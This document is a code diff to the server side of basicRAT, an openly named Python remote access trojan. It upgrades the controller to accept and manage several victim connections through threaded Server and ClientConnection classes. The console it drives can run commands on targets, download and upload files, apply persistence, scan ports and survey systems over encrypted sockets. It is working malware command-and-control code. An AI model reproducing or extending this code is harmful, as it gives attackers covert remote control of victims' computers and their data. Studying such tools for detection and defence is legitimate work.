@@ -11,6 +11,7 @@ import readline
 import socket
 import struct
 import sys
+import threading
 import time
 
 from core import common
@@ -31,10 +32,13 @@ BANNER = '''
          https://github.com/vesche/basicRAT
 '''
 HELP_TEXT = '''
+client <id>         - Connect to a client.
+clients             - List connected clients.
 download <files>    - Download file(s).
 help                - Show this help menu.
+kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
-quit                - Gracefully kill client and server.
+quit                - Exit the server and end all client connections.
 rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
 scan <ip>           - Scan top 25 ports on a single host.
@@ -42,8 +46,99 @@ survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
-COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
-             'scan', 'survey', 'unzip', 'upload', 'wget' ]
+COMMANDS = [ 'client', 'clients', 'download', 'help', 'kill', 'persistence',
+             'quit', 'rekey', 'run', 'scan', 'survey', 'unzip', 'upload',
+             'wget' ]
+
+
+class Server(threading.Thread):
+    clients      = []
+    alive        = True
+    client_count = 0
+    
+    def __init__(self, port):
+        super(Server, self).__init__()
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.s.bind(('0.0.0.0', port))
+        self.s.listen(5)
+    
+    def run(self):
+        while True:
+            conn, addr = self.s.accept()
+            client = ClientConnection(conn, addr)
+            client_id = self.client_count
+            self.clients.append({'client_id': client_id, 'client': client})
+            self.client_count += 1
+    
+    def verify_client_id(self, client_id):
+        try:
+            return self.clients[int(client_id)]['client_id']
+        except (ValueError, IndexError):
+            print 'Error: Invalid client ID.'
+            return 'None'
+    
+    def select_client(self, client_id):
+        try:
+            return self.clients[int(client_id)]['client']
+        except (ValueError, IndexError):
+            print 'Error: Invalid client ID.'
+    
+    def get_clients(self):
+        return [c for c in self.clients if c['client'].alive]
+
+
+class ClientConnection(threading.Thread):
+    alive = True
+    
+    def __init__(self, conn, addr):
+        super(ClientConnection, self).__init__()
+        self.conn   = conn
+        self.addr   = addr
+        self.dh_key = crypto.diffiehellman(self.conn, server=True)
+        self.start()
+    
+    def send(self, prompt, cmd, action):
+        if not self.alive:
+            print 'Error: Client not connected.'
+            return
+        
+        # send prompt to client
+        self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
+        
+        # kill client connection
+        if cmd == 'kill':
+            kill_option = raw_input('Kill this client connection (y/N)? ')
+            if kill_option[0].lower() == 'y':
+                self.conn.close()
+        
+        # results of a command
+        elif cmd == 'run':
+            recv_data = self.conn.recv(4096)
+            print crypto.AES_decrypt(recv_data, self.dh_key).rstrip()
+        
+        
+        # download a file
+        elif cmd == 'download':
+            for fname in action.split():
+                fname = fname.strip()
+                filesock.recvfile(self.conn, fname, self.dh_key)
+
+        # send file
+        elif cmd == 'upload':
+            for fname in action.split():
+                fname = fname.strip()
+                filesock.sendfile(self.conn, fname, self.dh_key)
+
+        # regenerate DH key
+        elif cmd == 'rekey':
+            self.dh_key = crypto.diffiehellman(self.conn, server=True)
+
+        # results of survey, persistence, unzip, or wget
+        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
+            print 'Running {}...'.format(cmd)
+            recv_data = self.conn.recv(1024)
+            print crypto.AES_decrypt(recv_data, self.dh_key)
 
 
 def get_parser():
@@ -57,28 +152,22 @@ def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     port    = args['port']
+    
+    curr_client_id  = 'None'
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        s.bind(('0.0.0.0', port))
-    except socket.error:
-        print 'Error: Unable to start server, port {} in use?'.format(port)
-        sys.exit(1)
-
+    # print banner all sexy like
     for line in BANNER.split('\n'):
         time.sleep(0.05)
         print line
 
-    print 'basicRAT server listening on port {}...'.format(port)
-
-    s.listen(10)
-    conn, addr = s.accept()
-
-    DHKEY = crypto.diffiehellman(conn, server=True)
+    # start server
+    server = Server(port)
+    server.setDaemon(True)
+    server.start()
+    print 'basicRAT server listening for connections on port {}.'.format(port)
 
     while True:
-        prompt = raw_input('\n[{}] basicRAT> '.format(addr[0])).rstrip()
+        prompt = raw_input('\n[{}] basicRAT> '.format(curr_client_id)).rstrip()
 
         # allow noop
         if not prompt:
@@ -96,41 +185,39 @@ def main():
         if cmd == 'help':
             print HELP_TEXT
             continue
+        
+        # stop the server
+        elif cmd == 'quit':
+            quit_option = raw_input('Exit the server and end all client ' \
+                                    'connections (y/N)? ')
+            if quit_option[0].lower() == 'y':
+                # gracefull kill all clients here
+                sys.exit(0)
+            else:
+                continue
 
+        # select client
+        elif cmd == 'client':
+            new_client_id = server.verify_client_id(action)
+            if new_client_id != 'None':
+                curr_client_id = new_client_id
+            continue
+        
+        # list clients
+        elif cmd == 'clients':
+            print 'ID - Client Address'
+            for c in server.get_clients():
+                print '{:>2} - {}'.format(c['client_id'], c['client'].addr[0])
+            continue
+
+        # require client id
+        if curr_client_id == 'None':
+            print 'Error: Invalid client ID.'
+            continue
+        
         # send data to client
-        conn.send(crypto.AES_encrypt(prompt, DHKEY))
-
-        # stop server
-        if cmd == 'quit':
-            s.close()
-            sys.exit(0)
-
-        # results of command
-        elif cmd == 'run':
-            recv_data = conn.recv(4096)
-            print crypto.AES_decrypt(recv_data, DHKEY).rstrip()
-
-        # download a file
-        elif cmd == 'download':
-            for fname in action.split():
-                fname = fname.strip()
-                filesock.recvfile(conn, fname, DHKEY)
-
-        # send file
-        elif cmd == 'upload':
-            for fname in action.split():
-                fname = fname.strip()
-                filesock.sendfile(conn, fname, DHKEY)
-
-        # regenerate DH key
-        elif cmd == 'rekey':
-            DHKEY = crypto.diffiehellman(conn, server=True)
-
-        # results of survey, persistence, unzip, or wget
-        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
-            print 'Running {}...'.format(cmd)
-            recv_data = conn.recv(1024)
-            print crypto.AES_decrypt(recv_data, DHKEY)
+        client = server.select_client(curr_client_id)
+        client.send(prompt, cmd, action)
 
 
 if __name__ == '__main__':
